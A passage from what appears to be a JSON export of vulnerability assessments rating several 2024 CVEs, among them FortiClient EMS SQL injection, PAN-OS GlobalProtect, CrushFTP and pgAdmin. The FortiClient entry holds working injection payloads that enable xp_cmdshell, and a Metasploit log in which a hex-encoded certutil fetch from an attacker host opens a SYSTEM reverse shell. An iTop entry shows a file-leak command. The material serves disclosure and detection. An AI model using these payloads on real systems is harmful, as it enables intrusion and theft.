-0700\r\n[*] Cleaning up...\r\nmeterpreter > getuid\r\nServer username: solr\r\nmeterpreter > sysinfo\r\nComputer     : 192.168.128.2\r\nOS           : Ubuntu 20.04 (Linux 6.6.16-linuxkit)\r\nArchitecture : x64\r\nBuildTuple   : x86_64-linux-musl\r\nMeterpreter  : x64/linux\r\nmeterpreter >\r\n```\r\n\r\n\r\n",
      "score": 2,
      "metadata": {
        "mitre-tactics": "Execution",
        "attacker-value": 3,
        "exploitability": 4
      },
      "tags": [
        {
          "id": "240789d2-3e0b-4967-a6a4-8f09029f642d",
          "name": "Unauthenticated",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "pre_auth"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        }
      ]
    },
    {
      "id": "580f324d-6255-4062-b508-2d0ffa1bf44c",
      "editorId": "de2686f1-1a8a-4518-8379-12188d859523",
      "topicId": "c308da96-54ec-450f-8416-91e1305968e3",
      "created": "2024-04-12T19:09:49.763648Z",
      "revisionDate": "2024-04-17T00:33:53.56977Z",
      "document": "An SQLi injection vulnerability exists in FortiNet FortiClient EMS (Endpoint Management Server). FortiClient EMS serves as an endpoint management solution tailored for enterprises, offering a centralized platform for overseeing enrolled endpoints. The SQLi vulnerability is due to user controller strings which can be sent directly into database queries.\r\n\r\nAffected versions of FortiClient EMS include:\r\n 7.2.0 through 7.2.2\r\n 7.0.1 through 7.0.10\r\n\r\nFcmDaemon.exe is the main service responsible for communicating with enrolled clients. By default it listens on port 8013 and communicates with FCTDas.exe which is responsible for translating requests and sending them to the database. In the message header of a specific request sent between the two services, the `FCTUID` parameter is vulnerable to SQLi. The SQLi can be used to enable the `xp_cmdshell` which can then be used to obtain unauthenticated remote code execution in the context of `NT AUTHORITY\\SYSTEM`.\r\n\r\nIt should be noted that in order to be vulnerable, at least one endpoint needs to be enrolled / managed by FortiClient EMS for the necessary vulnerable services to be available. So technically the server, out of the box, is not vulnerable in its default configuration which usually diminishes an exploit\u2019s attacker value. However, it\u2019s quite unlikely that an Endpoint Management Server running in production would not be managing any endpoints so I personally think it still deserves a 5/5 for an **Attacker Value** and given the simplicity and unauthenticated nature of the exploit, 5/5 for **Exploitability** as well. \r\n\r\n# Testing SQLi \r\nOne can test the vulnerability by establishing a TCP socket with SSL enabled on port 8013 of an endpoint running FortiClient EMS. If you then send the following data on across the established connection, which injects the following SQL: `' OR 1=1; \u2013` into the vulnerable `FCTID` parameter:\r\n\r\n```\r\nMSG_HEADER: FCTUID=CBE8FC122B1A46D18C3541E1A8EFF7BD' OR 1=1; --\r\nIP=127.0.0.1\r\nMAC=86:fc:61:82:77:66\r\nFCT_ONNET=0\r\nCAPS=32767\r\nVDOM=default\r\nEC_QUARANTINED=0\r\nSIZE=    1581\r\n\r\nX-FCCK-REGISTER: SYSINFO||QVZTSUdfVkVSPTEuMDAwMDAKUkVHX0tFWT1fCkVQX09OTkVUQ0hLU1VNPTAKQVZFTkdfVkVSPTYuMDAyNjYKREhDUF9TRVJWRVI9Tm9uZQpGQ1RPUz1XSU42NApWVUxTSUdfVkVSPTEuMDAwMDAKRkNUVkVSPTcuMC43LjAzNDUKQVBQU0lHX1ZFUj0xMy4wMDM2NApVU0VSPUFkbWluaXN0cmF0b3IKQVBQRU5HX1ZFUj00LjAwMDgyCkFWQUxTSUdfVkVSPTAuMDAwMDAKVlVMRU5HX1ZFUj0yLjAwMDMyCk9TVkVSPU1pY3Jvc29mdCBXaW5kb3dzIFNlcnZlciAyMDE5ICwgNjQtYml0IChidWlsZCAxNzc2MykKQ09NX01PREVMPVZNd2FyZSBWaXJ0dWFsIFBsYXRmb3JtClJTRU5HX1ZFUj0xLjAwMDIwCkFWX1BST1RFQ1RFRD0wCkFWQUxFTkdfVkVSPTAuMDAwMDAKUEVFUl9JUD0KRU5BQkxFRF9GRUFUVVJFX0JJVE1BUD00OQpFUF9PRkZORVRDSEtTVU09MApJTlNUQUxMRURfRkVBVFVSRV9CSVRNQVA9MTU4NTgzCkVQX0NIS1NVTT0wCkhJRERFTl9GRUFUVVJFX0JJVE1BUD0xNTU5NDMKRElTS0VOQz0KSE9TVE5BTUU9Q1lCRVItUkVUUUIxRkxQCkFWX1BST0RVQ1Q9CkZDVF9TTj1GQ1Q4MDAxNjM4ODQ4NjUxCklOU1RBTExVSUQ9NDUzQzIwNzYtODA2Mi00NEEwLUExNUYtRTkxQzYzREVCMUJCCk5XSUZTPUV0aGVybmV0MHwyNTEuMjUxLjIyMC4yN3wxNTpiYzphZjowZDo0Yjo3M3wyNDIuMTI0LjE5Ny43Nnw3Nzo5ZTpiOTpjMTo5Njo4NnwxfCp8MApVVEM9MTcxMDI3MTc3NApQQ19ET01BSU49CkNPTV9NQU49Vk13YXJlLCBJbmMuCkNQVT1JbnRlbChSKSBYZW9uKFIpIFNpbHZlciA0MjE1IENQVSBAIDIuNTBHSHoKTUVNPTEyMjg3CkhERD05OQpDT01fU049Vk13YXJlLTQyIDA0IGVkIDJkIDY0IGU4IDBiIDE0LTQ1IGU5IGU0IGY2IDVhIGM3IDY3IDgyCkRPTUFJTj0KV09SS0dST1VQPVdPUktHUk9VUApVU0VSX1NJRD1TLTEtNS0yMS0zMC0wLTMwLTUwMApHUk9VUF9UQUc9CkFER1VJRD0KRVBfRkdUQ0hLU1VNPTAKRVBfUlVMRUNIS1NVTT0wCldGX0ZJTEVTQ0hLU1VNPTAKRVBfQVBQQ1RSTENIS1NVTT0wCg==\r\nX-FCCK-REGISTER-END\r\n```\r\n\r\nA vulnerable endpoint will return a response containing the string `KA_INTERVAL` like so:\r\n```\r\nFCKARPLY: CONT|1|EMSSN|FCTEMS0000125975:dc2.kerberos.issue|UPLD_PRT|8013|KA_INTERVAL|60|LIC_FEATS|283004|LIC_ED|1870228800|AUTH_PRD|0|SNAPTIME|0|QUAR|0|AVTR|1|AV_SIG|92.03303|SERIAL|6C68D8277A537F95521BB0C8310727DF46D3C97B|EMS_ONNET|0|ZHVR|eJzVmG1zojAQgL/fr8j5XYEAam8oHY/SlzmtnbbXzk3tMCkGTI3ghPjSf39RQLSlFG+sN35Rkt3N7j5JFhLjZD6iYIpZRMLguKLU5ArAgRv2SeAfVybcqzYrJ+Y3wwsZJy4lOOCOGwYe8ScMcWFjGomx2ajJtYYhpU1jjIQJom/UFUPKFxiDMOKOsCYecZOuEZo7HPmOR5G/sNxoL6VsQnHc1BN51mMsHqP4L/7NNNe0AjQS4u+P1mnrrvXYuQXXLJy/3g4wpeB+QgPM0DPFT0+mIcWqYWTOSNAPZ5EhiWfDZYSLsJFpeBjxCcOmO8XONDEllHCChWoqTPUXCQoEXCDN3Fv3dhXKUKmqCpQbS6crnQD7gssUm7KIJH0W8mw4KQuFL1JbsNoivUw9gy7H3TEqaTmqlAFdx6o1DgGrpkP1oLCq9YPAqjUODKtegPXGnhLqXHYtB8+3Y+kRisvC+9EbzkI2FJW2h3whqqXOdsrwfS454I7Kc9NKcXMZ3x+31NkXcUuHz+HWLM9NLcWNYZ9EnL06Q/y6FcDUsCTEi1/2H6fdtVptp9OyLi6v7N5t9+zuoXVj9x66D3VNhVdhH/d+UuQO2wJf1EFcjNb7StDvks8hXn6HF23w+84MMQymlsgCM3AmVh/4PaYh6oMqWFU1CGVZ33cpzZzulPK2GedV13r5b4Hid5Y9dwco8DG4sewN9/Wmvn/gK6e7fnd9nmYeZb18TSmg3OIURRFBAeieX7U3I4AiAkXV9gt63elOQZfNNI+1Vpo1LGB9TngbPQPLlmwbWOFohII+uAxesLs4xmzuL/g/Kgr8ioryL1nnzYFaeg6Kzm3XExph4V4cVEfL0yM4JZFLw0hwWsWiHFUVRVfkvc7AhtOdzsD2Oefxh6X5y0X1ZozcAQbt0Nde1ude0yBs7nvFZ053W2k+zTGPr/IhXym5oBB90ZrTdK1nVu9DQZQmn0uY4b4T38xEb2JInMXDSzn3K9LH1zp/AQpaQ/A=|HVCS|913c523b8b79d4714cbdb64e7cc6268c|TAGS|000000000000000000000000000000000000000000000000000|\r\n```\r\n\r\n# Getting RCE\r\nThe SQLi injection can be used to obtain unauthenticated RCE on the vulnerable FortiClient EMS endpoint by enabling the `xp_cmdshell`. As demonstrated in the metasploit module, the following five SQL injections can be used to enable `xp_cmdshell` and then use it to execute a payload:\r\n```\r\n      \"' OR 1=1; exec master.dbo.sp_configure 'show advanced options', 1;--\",\r\n      \"' OR 1=1; reconfigure;--\",\r\n      \"' OR 1=1; exec master.dbo.sp_configure 'xp_cmdshell',1;--\",\r\n      \"' OR 1=1; reconfigure;--\",\r\n      \"' OR 1=1; DECLARE @SQL VARCHAR(#{payload.encoded.length}) = CONVERT(VARCHAR(MAX), 0X#{payload.encoded.unpack('H*').first}); exec master.dbo.xp_cmdshell @sql;--\",\r\n```\r\n\r\nWhen attempting to obtain RCE it was noticed that the application takes the command that you inject and transforms it to all uppercase characters (this can be seen in the logs included in the IOC section below). This breaks any attempt to Base64 encode a payload and then run it using `master.dbo.xp_cmdshell powershell.exe -e <Base64 encoded payload>` (as Base64 is case sensitive). Which is why the metasploit module encodes the payload in hex and then uses MSSQL to decode the payload before running it with `xp_cmdshell`. \r\n\r\n# Metasploit Module Demo\r\n```\r\nmsf6 exploit(windows/http/forticlient_ems_fctid_sqli) > set rhosts 172.16.199.200\r\nrhosts => 172.16.199.200\r\nmsf6 exploit(windows/http/forticlient_ems_fctid_sqli) > set lhost 172.16.199.1\r\nlhost => 172.16.199.1\r\nmsf6 exploit(windows/http/forticlient_ems_fctid_sqli) > options\r\n\r\nModule options (exploit/windows/http/forticlient_ems_fctid_sqli):\r\n\r\n   Name    Current Setting  Required  Description\r\n   ----    ---------------  --------  -----------\r\n   RHOSTS  172.16.199.200   yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html\r\n   RPORT   8013             yes       The target port (TCP)\r\n   VHOST                    no        HTTP server virtual host\r\n\r\n\r\nPayload options (cmd/windows/http/x64/meterpreter/reverse_tcp):\r\n\r\n   Name                Current Setting  Required  Description\r\n   ----                ---------------  --------  -----------\r\n   EXITFUNC            process          yes       Exit technique (Accepted: '', seh, thread, process, none)\r\n   FETCH_COMMAND       CERTUTIL         yes       Command to fetch payload (Accepted: CURL, TFTP, CERTUTIL)\r\n   FETCH_DELETE        false            yes       Attempt to delete the binary after execution\r\n   FETCH_FILENAME      FqgyHVSnYd       no        Name to use on remote system when storing payload; cannot contain spaces or slashes\r\n   FETCH_SRVHOST                        no        Local IP to use for serving payload\r\n   FETCH_SRVPORT       8080             yes       Local port to use for serving payload\r\n   FETCH_URIPATH                        no        Local URI to use for serving payload\r\n   FETCH_WRITABLE_DIR  %TEMP%           yes       Remote writable dir to store payload; cannot contain spaces.\r\n   LHOST               172.16.199.1     yes       The listen address (an interface may be specified)\r\n   LPORT               8383             yes       The listen port\r\n\r\n\r\nExploit target:\r\n\r\n   Id  Name\r\n   --  ----\r\n   0   Automatic Target\r\n\r\n\r\n\r\nView the full module info with the info, or info -d command.\r\n\r\nmsf6 exploit(windows/http/forticlient_ems_fctid_sqli) >\r\nmsf6 exploit(windows/http/forticlient_ems_fctid_sqli) > run\r\n[*] Reloading module...\r\n\r\n[*] Started reverse TCP handler on 172.16.199.1:8383\r\n[*] 172.16.199.200:8013 - Running automatic check (\"set AutoCheck false\" to disable)\r\n[+] 172.16.199.200:8013 - The target is vulnerable. The SQLi has been exploited successfully\r\n[+] 172.16.199.200:8013 - The SQLi: ' OR 1=1; exec master.dbo.sp_configure 'show advanced options', 1;-- was executed successfully\r\n[+] 172.16.199.200:8013 - The SQLi: ' OR 1=1; reconfigure;-- was executed successfully\r\n[+] 172.16.199.200:8013 - The SQLi: ' OR 1=1; exec master.dbo.sp_configure 'xp_cmdshell',1;-- was executed successfully\r\n[+] 172.16.199.200:8013 - The SQLi: ' OR 1=1; reconfigure;-- was executed successfully\r\n[*] Sending stage (201798 bytes) to 172.16.199.200\r\n[+] 172.16.199.200:8013 - The SQLi: ' OR 1=1; DECLARE @SQL VARCHAR(120) = CONVERT(VARCHAR(MAX), 0X636572747574696c202d75\r\n726c6361636865202d6620687474703a2f2f3137322e31362e3139392e313a383038302f7a524b42764743776d624662474c46336c4e6f486d772025\r\n54454d50255c6a744d45695362632e6578652026207374617274202f42202554454d50255c6a744d45695362632e657865); exec master.dbo.xp_cmdshell @sql;-- was executed successfully\r\n[*] Meterpreter session 8 opened (172.16.199.1:8383 -> 172.16.199.200:57847) at 2024-04-11 14:00:22 -0700\r\n\r\nmeterpreter > getuid\r\nsyServer username: NT AUTHORITY\\SYSTEM\r\nmeterpreter > sysinfo\r\nComputer        : DC2\r\nOS              : Windows Server 2019 (10.0 Build 17763).\r\nArchitecture    : x64\r\nSystem Language : en_US\r\nDomain          : KERBEROS\r\nLogged On Users : 16\r\nMeterpreter     : x64/windows\r\nmeterpreter >\r\n```\r\n\r\n# IOCs\r\n\r\nThere are a number of files in `C:\\Program Files (x86)\\Fortinet\\FortiClientEMS\\logs\\` that will contain evidence of exploitation on a compromised host. The following excerpts were taking from `fcmdaemon[2024-04-10 15-29-42].log` and you can see the vulnerability being exploited as the `FTCUID` parameter `CBE8FC122B1A46D18C3541E1A8EFF7BD'` is being injected with SQL commands which enable the `xp_cmdshell` which is then used to launch calc.exe\r\n```\r\n\"CBE8FC122B1A46D18C3541E1A8EFF7BD' OR 1=1; EXEC MASTER.DBO.SP_CONFIGURE 'SHOW ADVANCED OPTIONS', 1;--\", \"vdom\":\"FCM_default\", \"jsonData\": \"{}\", \"ops\": [], \"flag\":0}\r\n\r\n[04-11 11:10:29][    ERROR]: DAS returned an error - Error = Internal error, Command was = {\"operation\": \"UPDATE\", \"model\": \"FORTI_CLIENT\", \"id\": \"CBE8FC122B1A46D18C3541E1A8EFF7BD' OR 1=1; EXEC MASTER.DBO.SP_CONFIGURE 'SHOW ADVANCED OPTIONS', 1;--\", \"vdom\":\"FCM_default\", \"jsonData\": \"{\\\"uid\\\":\\\"\\\",\\\"last_seen\\\":1712848228,\\\"online\\\":1}\", \"ops\": [], \"flag\":0}\r\n\r\n[04-11 11:10:29][    ERROR]: DAS returned an error - Error = mssql: Incorrect syntax near the keyword 'AND'., Command was = {\"operation\": \"GET_BY_UID\", \"model\": \"FCT_USERS\", \"id\": \"CBE8FC122B1A46D18C3541E1A8EFF7BD' OR 1=1; RECONFIGURE;--\", \"vdom\":\"FCM_default\", \"jsonData\": \"{}\", \"ops\": [], \"flag\":0}\r\n\r\n[04-11 11:10:29][    ERROR]: DAS returned an error - Error = Internal error, Command was = {\"operation\": \"UPDATE\", \"model\": \"FORTI_CLIENT\", \"id\": \"CBE8FC122B1A46D18C3541E1A8EFF7BD' OR 1=1; RECONFIGURE;--\", \"vdom\":\"FCM_default\", \"jsonData\": \"{\\\"uid\\\":\\\"\\\",\\\"last_seen\\\":1712848229,\\\"online\\\":1}\", \"ops\": [], \"flag\":0}\r\n\r\n[04-11 11:10:29][    ERROR]: DAS returned an error - Error = mssql: Incorrect syntax near the keyword 'AND'., Command was = {\"operation\": \"GET_BY_UID\", \"model\": \"FCT_USERS\", \"id\": \"CBE8FC122B1A46D18C3541E1A8EFF7BD' OR 1=1; EXEC MASTER.DBO.SP_CONFIGURE 'XP_CMDSHELL',1;--\", \"vdom\":\"FCM_default\", \"jsonData\": \"{}\", \"ops\": [], \"flag\":0}\r\n\r\n[04-11 11:10:29][    ERROR]: DAS returned an error - Error = Internal error, Command was = {\"operation\": \"UPDATE\", \"model\": \"FORTI_CLIENT\", \"id\": \"CBE8FC122B1A46D18C3541E1A8EFF7BD' OR 1=1; EXEC MASTER.DBO.SP_CONFIGURE 'XP_CMDSHELL',1;--\", \"vdom\":\"FCM_default\", \"jsonData\": \"{\\\"uid\\\":\\\"\\\",\\\"last_seen\\\":1712848229,\\\"online\\\":1}\", \"ops\": [], \"flag\":0}\r\n\r\n[04-11 11:10:29][    ERROR]: DAS returned an error - Error = mssql: Incorrect syntax near the keyword 'AND'., Command was = {\"operation\": \"GET_BY_UID\", \"model\": \"FCT_USERS\", \"id\": \"CBE8FC122B1A46D18C3541E1A8EFF7BD' OR 1=1; RECONFIGURE;--\", \"vdom\":\"FCM_default\", \"jsonData\": \"{}\", \"ops\": [], \"flag\":0}\r\n\r\n[04-11 11:10:29][    ERROR]: DAS returned an error - Error = Internal error, Command was = {\"operation\": \"UPDATE\", \"model\": \"FORTI_CLIENT\", \"id\": \"CBE8FC122B1A46D18C3541E1A8EFF7BD' OR 1=1; RECONFIGURE;--\", \"vdom\":\"FCM_default\", \"jsonData\": \"{\\\"uid\\\":\\\"\\\",\\\"last_seen\\\":1712848229,\\\"online\\\":1}\", \"ops\": [], \"flag\":0}\r\n\r\n[04-11 11:10:29][    ERROR]: DAS returned an error - Error = mssql: Incorrect syntax near the keyword 'AND'., Command was = {\"operation\": \"GET_BY_UID\", \"model\": \"FCT_USERS\", \"id\": \"CBE8FC122B1A46D18C3541E1A8EFF7BD' OR 1=1; EXEC MASTER.DBO.XP_CMDSHELL 'CMD.EXE /C CALC.EXE';--\", \"vdom\":\"FCM_default\", \"jsonData\": \"{}\", \"ops\": [], \"flag\":0}\r\n\r\n[04-11 11:10:30][    ERROR]: DAS returned an error - Error = Internal error, Command was = {\"operation\": \"UPDATE\", \"model\": \"FORTI_CLIENT\", \"id\": \"CBE8FC122B1A46D18C3541E1A8EFF7BD' OR 1=1; EXEC MASTER.DBO.XP_CMDSHELL 'CMD.EXE /C CALC.EXE ';--\", \"vdom\":\"FCM_default\", \"jsonData\": \"{\\\"uid\\\":\\\"\\\",\\\"last_seen\\\":1712848229,\\\"online\\\":1}\", \"ops\": [], \"flag\":0}\r\n\r\n```\r\n\r\n# References\r\nhttps://www.horizon3.ai/attack-research/attack-blogs/cve-2023-48788-fortinet-forticlientems-sql-injection-deep-dive/\r\n",
      "score": 2,
      "metadata": {
        "mitre-tactics": "Initial Access",
        "attacker-value": 5,
        "exploitability": 5
      },
      "tags": [
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        },
        {
          "id": "791283de-d643-4ede-850e-91a6edb897db",
          "name": "Exploited in the wild",
          "type": "exploited_in_the_wild",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "exploited_in_the_wild"
        },
        {
          "id": "8f7ef49d-26f4-46b1-9676-599f6669f4d3",
          "name": "Gives privileged access",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "high_privilege_access"
        },
        {
          "id": "240789d2-3e0b-4967-a6a4-8f09029f642d",
          "name": "Unauthenticated",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "pre_auth"
        }
      ]
    },
    {
      "id": "01172dad-2c49-4d1f-b25a-e9a090b0d9ca",
      "editorId": "08c34597-438e-4965-b63a-84761307f0d3",
      "topicId": "2fff9e98-f7c9-4c36-9bae-05942516e954",
      "created": "2024-04-16T12:47:40.394448Z",
      "revisionDate": "2024-04-16T15:01:50.060097Z",
      "document": "An OS command injection vulnerability exists within Palo Alto Global Protect effecting the following versions with an overall rating of 10/10:\r\n\r\nPAN-OS 11.1\t< 11.1.2-h3\r\nPAN-OS 11.0\t< 11.0.4-h1\r\nPAN-OS 10.2\t< 10.2.7-h8, < 10.2.8-h3, < 10.2.9-h1\r\n\r\nCurrent information known is that this vulnerability also requires that GlobalProtect gateway and device telemetry are configured. Mitigating exploitation of this vulnerability can be done by disabling telemetry according to the vendor. \r\n\r\nAn brief OSINT investigation reveals that POC exploit code of this vulnerability does exist in the wild but during my search I only found one reference and no other articles covering the root cause of this vulnerability. Poc can be found here: https://github.com/h4x0r-dz/CVE-2024-3400?tab=readme-ov-file credit to w2xim3 for finding this\r\n\r\nPlease feel free to correct any inaccurate information. in this post. thank you. ",
      "score": 1,
      "metadata": {
        "mitre-tactics": "Execution"
      },
      "tags": [
        {
          "id": "791283de-d643-4ede-850e-91a6edb897db",
          "name": "Exploited in the wild",
          "type": "exploited_in_the_wild",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "exploited_in_the_wild"
        },
        {
          "id": "240789d2-3e0b-4967-a6a4-8f09029f642d",
          "name": "Unauthenticated",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "pre_auth"
        }
      ]
    },
    {
      "id": "50f9099c-6b92-4ce1-bb60-a30de187735b",
      "editorId": "2dc5dd1e-c295-4dd9-bd7b-f3b77d6dbda5",
      "topicId": "2fff9e98-f7c9-4c36-9bae-05942516e954",
      "created": "2024-04-16T21:47:17.178717Z",
      "revisionDate": "2024-04-17T13:31:40.835418Z",
      "document": "CVE-2024-3400, which is technically a chain of two vulnerabilities, is an unauthenticated remote code execution exploit for software with a broad public attack surface. This vulnerability was discovered when it was used by a suspected nation state actor in the wild for initial access; needless to say, this is a bad one. Though some early communication indicated that turning off telemetry or enforcing threat signature detection might prevent exploitation, patching PAN-OS is necessary. Remediation of CVE-2024-3400 should be a high priority for organizations. When patches are applied, check for the IOCs outlined in the official Rapid7 analysis to identify any prior successful exploitation.",
      "score": 3,
      "metadata": {
        "mitre-tactics": "Initial Access",
        "attacker-value": 5,
        "exploitability": 4
      },
      "tags": [
        {
          "id": "19076e68-1c52-48c1-bc15-7f6a3053c357",
          "name": "CISA KEV Listed",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "cisa_kev_listed"
        },
        {
          "id": "392ac474-91f1-4944-ad4f-78ce648b2df7",
          "name": "Common in enterprise",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "common_enterprise"
        },
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        },
        {
          "id": "791283de-d643-4ede-850e-91a6edb897db",
          "name": "Exploited in the wild",
          "type": "exploited_in_the_wild",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "exploited_in_the_wild"
        },
        {
          "id": "8f7ef49d-26f4-46b1-9676-599f6669f4d3",
          "name": "Gives privileged access",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "high_privilege_access"
        },
        {
          "id": "240789d2-3e0b-4967-a6a4-8f09029f642d",
          "name": "Unauthenticated",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "pre_auth"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        }
      ]
    },
    {
      "id": "fb17e697-4923-4bf1-8e60-b77a7bb4072a",
      "editorId": "38346220-4c55-4428-af6f-466a697194f3",
      "topicId": "e16753d7-0bca-4e2a-94d7-88409fd115ca",
      "created": "2024-04-18T20:37:11.901356Z",
      "revisionDate": "2024-04-18T20:37:11.900497Z",
      "document": "[php_filter_chains_oracle_exploit](https://github.com/synacktiv/php_filter_chains_oracle_exploit) makes it easy to wayponize.\r\n\r\n```\r\n$ python3 filters_chain_oracle_exploit.py --target http://localhost/pages/ajax.render.php --headers '{\"Cookie\":\"itop-bf***6g\"}' --data '{\"operation\":\"dashboard_editor\", \"id\":\"999999999\"}' --parameter file --file /etc/issue\r\n[*] Additionnal data used : {\"operation\":\"dashboard_editor\", \"id\":\"999999999\"}\r\n[*] Additionnal headers used : {\"Cookie\":\"itop-bf***6g\"}\r\n[+] File /etc/issue leak is finished!\r\nb'RGViaWFuIEdOVS9MaW51eCAxMSBcbiBcbAoK'\r\nDebian GNU/Linux 11 \\n \\l\r\n```",
      "score": 1,
      "metadata": {
        "mitre-tactics": "Discovery",
        "attacker-value": 3,
        "exploitability": 3
      },
      "tags": [
        {
          "id": "392ac474-91f1-4944-ad4f-78ce648b2df7",
          "name": "Common in enterprise",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "common_enterprise"
        },
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        },
        {
          "id": "b65c2492-bb05-477a-86bb-0c9569f80141",
          "name": "Authenticated",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "post_auth"
        }
      ]
    },
    {
      "id": "3e0e1e02-fd8f-4036-a085-1348c36a62f8",
      "editorId": "2dc5dd1e-c295-4dd9-bd7b-f3b77d6dbda5",
      "topicId": "46707820-42d9-44a3-a84a-7f8465055536",
      "created": "2024-04-24T22:30:05.940835Z",
      "revisionDate": "2024-04-26T22:14:56.55366Z",
      "document": "CVE-2024-4040 was discovered by Simon Garrelou, of Airbus CERT, and it's a server-side template injection vulnerability for the CrushFTP managed file transfer suite. The vulnerability was reported to CrushFTP on Friday, April 19, 2024. That same day, it was patched and announced via the vendor's security mailing list, though a CVE wasn't assigned until Monday, April 22, 2024. The vulnerability impact is primarily unauthenticated arbitrary high-privilege file disclosure, and it can result in full compromise of CrushFTP instances via multiple paths. Additionally, Rapid7 has confirmed that it's possible to establish remote code execution as a result of the file disclosure primitive.\r\n\r\nAnyone running CrushFTP should patch with urgency. When the patch is applied, check for the IOCs outlined in the official Rapid7 analysis to identify any prior successful exploitation. As noted in the analysis, defenders should be aware that exploitation may be masked in logs via mangled exploit web requests.",
      "score": 4,
      "metadata": {
        "mitre-tactics": "Execution",
        "attacker-value": 5,
        "exploitability": 5
      },
      "tags": [
        {
          "id": "19076e68-1c52-48c1-bc15-7f6a3053c357",
          "name": "CISA KEV Listed",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "cisa_kev_listed"
        },
        {
          "id": "392ac474-91f1-4944-ad4f-78ce648b2df7",
          "name": "Common in enterprise",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "common_enterprise"
        },
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        },
        {
          "id": "791283de-d643-4ede-850e-91a6edb897db",
          "name": "Exploited in the wild",
          "type": "exploited_in_the_wild",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "exploited_in_the_wild"
        },
        {
          "id": "8f7ef49d-26f4-46b1-9676-599f6669f4d3",
          "name": "Gives privileged access",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "high_privilege_access"
        },
        {
          "id": "240789d2-3e0b-4967-a6a4-8f09029f642d",
          "name": "Unauthenticated",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "pre_auth"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        }
      ]
    },
    {
      "id": "010cd2a6-6916-4678-a313-7fe079646dfc",
      "editorId": "1754d880-537c-48c4-8738-5ad2ccde5258",
      "topicId": "30992124-59d8-49ab-987c-d4613a7687a7",
      "created": "2024-05-07T18:45:13.565042Z",
      "revisionDate": "2024-05-10T08:37:19.263529Z",
      "document": "pgAdmin versions <=8.3 are vulnerable to a path traversal vulnerability in the session handling logic. This can be leveraged by an attacker to load a malicious serialized object and execute Python code within the context of the application. On Linux servers, this requires the ability to write files to the target. pgAdmin has a file management component that is available by default for users. With a known username and password, a user can authenticate to pgAdmin, upload a malicious object, and trigger code execution through the path traversal vulnerability. It should be noted that [CVE-2024-4215](https://attackerkb.com/assessments/40f2eb9e-ea23-4efe-8af8-87efff9250d7) affects a superset of pgAdmin versions and, therefore, an attacker would be able to leverage an account regardless of it's MFA enrollment status.\r\n\r\nWhen targeting Windows servers, the vulnerability can lead to code execution by using a UNC path in place of the path traversal. Insecure outbound guest access was [disabled by default](https://learn.microsoft.com/en-us/troubleshoot/windows-server/networking/guest-access-in-smb2-is-disabled-by-default) in Windows 10 v1709 (Redstone 3). To leverage this technique, the target would either need to be an older system, or have guest access explicitly enabled. Alternatively, Windows servers can also be exploited by using the same file management functionality provided by pgAdmin.\r\n\r\nThis vulnerability was fixed in commit [4e49d75](https://github.com/pgadmin-org/pgadmin4/commit/4e49d752fba72953acceeb7f4aa2e6e32d25853d).",
      "score": 3,
      "metadata": {
        "attacker-value": 4,
        "exploitability": 3
      },
      "tags": [
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        }
      ]
    },
    {
      "id": "40f2eb9e-ea23-4efe-8af8-87efff9250d7",
      "editorId": "1754d880-537c-48c4-8738-5ad2ccde5258",
      "topicId": "9afcca1c-c023-49f1-a871-0869f1f54692",
      "created": "2024-05-07T18:52:26.609138Z",
      "revisionDate": "2024-05-07T20:20:11.831023Z",
